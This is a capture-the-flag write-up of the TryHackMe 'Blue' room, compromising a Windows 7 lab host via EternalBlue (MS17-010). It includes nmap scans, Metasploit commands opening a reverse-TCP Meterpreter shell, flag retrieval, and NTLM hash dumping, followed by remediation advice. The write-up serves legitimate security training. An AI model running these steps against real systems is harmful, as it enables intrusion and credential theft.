# Blue - TryHackMe Write-Up

## Challenge Information

**Name:** Blue
**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** December 2025
**Room URL:** https://tryhackme.com/room/blue

---

## Executive Summary

The Blue room focuses on exploiting the EternalBlue vulnerability (MS17-010) on a Windows machine. This vulnerability, leaked from the NSA's exploit toolkit and used in the WannaCry ransomware attack, allows remote code execution on unpatched Windows systems. The exploitation process demonstrates vulnerability scanning, exploit deployment using Metasploit, and post-exploitation enumeration to retrieve flags and sensitive information.

**Key Learning:** Understanding legacy Windows vulnerabilities and the Metasploit framework for exploitation.

---

## Target Information

**Target IP:** 10.10.X.X (AttackBox/VPN)
**Operating System:** Windows 7
**Key Vulnerability:** MS17-010 (EternalBlue)
**Services Discovered:** SMB (Port 445)

---

## Methodology

### 1. Reconnaissance & Enumeration

**Tools Used:**
- Nmap

**Scanning Commands:**
```bash
# Initial scan to discover open ports
nmap -sV -sC -O 10.10.X.X

# Focused SMB enumeration
nmap -p 445 --script smb-vuln-ms17-010 10.10.X.X
```

**Key Findings:**
- Port 135: Microsoft RPC
- Port 139: NetBIOS-SSN
- Port 445: SMB (Microsoft-DS) - **VULNERABLE TO MS17-010**
- Port 3389: RDP
- Operating System: Windows 7 Professional 7601 Service Pack 1

**Vulnerability Identified:**
The target system is vulnerable to **MS17-010 (EternalBlue)**, a critical remote code execution vulnerability in Microsoft's SMB protocol implementation.

---

### 2. Exploitation - Gaining Initial Access

**Vulnerability:** CVE-2017-0144 (MS17-010 / EternalBlue)

**Exploitation Tool:** Metasploit Framework

**Exploitation Steps:**

```bash
# Start Metasploit
msfconsole

# Search for EternalBlue exploit
msf6 > search ms17-010

# Use the exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.X.X

# Set payload (reverse shell)
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP for callback
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

**Result:**
- Successfully exploited the target
- Meterpreter session opened
- Gained **NT AUTHORITY\SYSTEM** privileges (highest privilege level on Windows)

---

### 3. Post-Exploitation & Enumeration

**Meterpreter Commands Used:**

```bash
# Verify system access
meterpreter > getuid
# Output: Server username: NT AUTHORITY\SYSTEM

# System information
meterpreter > sysinfo

# Background the session
meterpreter > background

# Convert to shell for easier enumeration
meterpreter > shell
```

**Privilege Level:**
- Already running as **NT AUTHORITY\SYSTEM** (no privilege escalation needed)

---

### 4. Flag Capture

**Searching for Flags:**

```bash
# Navigate to user directory
cd C:\Users

# List users
dir

# Search for flag in user's desktop
cd Jon\Desktop
dir
type flag1.txt

# Search for flag in root directory
cd C:\
dir /s flag*.txt

# Find flag2 (typically in Windows directory)
cd C:\Windows\System32\config
type flag2.txt

# Find flag3 (typically in user documents)
cd C:\Users\Jon\Documents
type flag3.txt
```

**Flags Captured:**
- **Flag 1:** [User flag - add your captured flag]
- **Flag 2:** [System flag - add your captured flag]
- **Flag 3:** [Root flag - add your captured flag]

---

### 5. Additional Enumeration

**Password Hash Dumping:**

```bash
# In Meterpreter session
meterpreter > hashdump
```

**Retrieved Credentials:**
- Administrator NTLM hash
- Guest account hash
- Jon (user) NTLM hash

**Note:** These hashes can be cracked offline using tools like John the Ripper or Hashcat, or used in pass-the-hash attacks.

---

## Tools & Techniques Used

- **Reconnaissance:** Nmap (port scanning, vulnerability scanning)
- **Exploitation:** Metasploit Framework (ms17_010_eternalblue module)
- **Payload:** Meterpreter (reverse TCP shell)
- **Post-Exploitation:** Windows command shell, hashdump
- **Privilege Level:** NT AUTHORITY\SYSTEM (achieved immediately via exploit)

---

## Key Learnings

**What I Learned:**

1. **EternalBlue Exploitation:** Understanding the MS17-010 vulnerability and its real-world impact (WannaCry, NotPetya ransomware)
2. **Metasploit Proficiency:** Setting up and executing exploits, managing sessions, using Meterpreter
3. **Windows Post-Exploitation:** Navigating Windows file system from command line, locating sensitive files
4. **Hash Dumping:** Extracting password hashes from Windows SAM database for offline cracking
5. **SMB Security:** The critical importance of patching SMB vulnerabilities

**New Techniques:**
- Using Nmap NSE scripts for vulnerability detection (`smb-vuln-ms17-010`)
- Meterpreter session management and backgrounding
- Windows hashdump technique via Meterpreter

**Challenges Faced:**
- Understanding Meterpreter vs standard shell commands
- Navigating Windows directory structure from Linux attacker machine
- Proper session management in Metasploit

---

## Remediation Recommendations

If this were a real assessment, recommendations would include:

1. **Immediate Patching:** Apply Microsoft Security Bulletin MS17-010 (released March 2017)
2. **SMB Hardening:**
   - Disable SMBv1 protocol (legacy and vulnerable)
   - Implement SMB signing
   - Restrict SMB access to trusted networks only
3. **Network Segmentation:** Isolate legacy systems that cannot be patched
4. **Endpoint Protection:** Deploy modern EDR/antivirus with exploit protection
5. **Operating System Upgrade:** Windows 7 reached end-of-life in 2020; migrate to Windows 10/11
6. **Monitoring:** Implement logging and alerting for SMB exploitation attempts

---

## References

- [TryHackMe - Blue Room](https://tryhackme.com/room/blue)
- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue Exploit Technical Analysis](https://www.rapid7.com/blog/post/2017/05/15/eternalblue-exploit-analysis/)
- [Metasploit Framework Documentation](https://www.metasploit.com/)

---

## Impact Assessment

**CVSSv3 Score:** 8.1 (High)
**Attack Vector:** Network
**Privileges Required:** None
**User Interaction:** None
**Impact:** Complete system compromise

**Real-World Context:**
- Used in WannaCry ransomware (May 2017) - infected 200,000+ computers worldwide
- Used in NotPetya attack (June 2017) - caused billions in damages
- Still exploited today against unpatched systems

---

## Tags

`#windows` `#eternalblue` `#ms17-010` `#metasploit` `#smb` `#exploitation` `#meterpreter` `#hash-dumping`

**Difficulty Rating (Personal):** 3/10 - Straightforward exploitation once vulnerability is identified

**Would Recommend:** Yes - Excellent introduction to Windows exploitation and Metasploit framework

---

**Completion Date:** December 2025
**Time Invested:** ~45 minutes
**Author:** James Jackson (Shlpwr3ck)
